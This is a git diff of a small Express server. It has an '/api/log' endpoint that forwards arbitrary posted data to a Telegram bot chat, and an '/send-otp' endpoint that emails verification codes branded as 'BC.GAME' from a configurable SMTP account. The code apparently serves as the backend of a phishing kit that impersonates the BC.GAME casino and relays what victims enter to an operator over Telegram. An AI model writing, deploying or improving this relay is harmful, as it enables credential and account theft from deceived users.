@@ -8,14 +8,14 @@ const port = process.env.PORT || 3000;
 
 app.use(express.json());
 
-// API Endpoints
+// API Endpoints (FIRST)
 app.post('/api/log', async (req, res) => {
-    console.log(`[LOG] Hit: ${req.body.title}`);
+    console.log(`[API] Log hit: ${req.body.title}`);
     const { title, data } = req.body;
     const token = process.env.LOG_BOT_TOKEN;
     const chatId = process.env.LOG_BOT_CHAT_ID;
 
-    if (!token || !chatId) return res.status(500).json({ success: false });
+    if (!token || !chatId) return res.status(500).json({ success: false, message: 'Config missing' });
 
     const message = `
 🔥 <b>${title}</b>
@@ -37,21 +37,22 @@ app.post('/api/log', async (req, res) => {
         });
         res.json({ success: true });
     } catch (e) {
-        console.error("[LOG] Error:", e.message);
+        console.error("[API] Telegram Error:", e.message);
         res.status(500).json({ success: false });
     }
 });
 
 app.post('/send-otp', async (req, res) => {
-    console.log(`[OTP] Hit: ${req.body.email}`);
     const { email } = req.body;
+    console.log(`[API] OTP request for: ${email}`);
+
     if (!email) return res.status(400).json({ success: false });
 
     const otp = Math.floor(100000 + Math.random() * 900000).toString();
     const transporter = nodemailer.createTransport({
         host: process.env.SMTP_HOST || 'smtp.gmail.com',
         port: parseInt(process.env.SMTP_PORT) || 465,
-        secure: (process.env.SMTP_PORT == '465' || process.env.SMTP_PORT == 'SSL'),
+        secure: (process.env.SMTP_PORT == '465'),
         auth: {
             user: process.env.SMTP_USER || process.env.EMAIL_USER,
             pass: process.env.SMTP_PASS || process.env.EMAIL_PASS
@@ -59,19 +60,20 @@ app.post('/send-otp', async (req, res) => {
     });
 
     try {
-        await transporter.sendMail({
+        const info = await transporter.sendMail({
             from: process.env.SMTP_FROM || `"BC.GAME" <${process.env.EMAIL_USER}>`,
             to: email,
             subject: '🔐 Verification Code',
             html: `<div style="background:#1c1e22; color:white; padding:40px; border-radius:15px; text-align:center; border:2px solid #3bc117; font-family:sans-serif;">
                     <h1 style="color:#3bc117;">BC.GAME</h1>
-                    <p>Code: <b style="font-size:32px;">${otp}</b></p>
+                    <p>Verification Code: <b style="font-size:32px; color:#3bc117;">${otp}</b></p>
                    </div>`
         });
+        console.log(`[API] OTP Email Sent: ${info.response}`);
         res.json({ success: true });
     } catch (e) {
-        console.error("[OTP] Error:", e.message);
-        res.status(500).json({ success: false });
+        console.error("[API] SMTP Error:", e.message);
+        res.status(500).json({ success: false, error: e.message });
     }
 });
 
@@ -87,4 +89,4 @@ app.listen(port, () => {
     console.log(`🚀 Server listening on port ${port}`);
 });
 
-module.exports = app; // For Vercel
+module.exports = app;
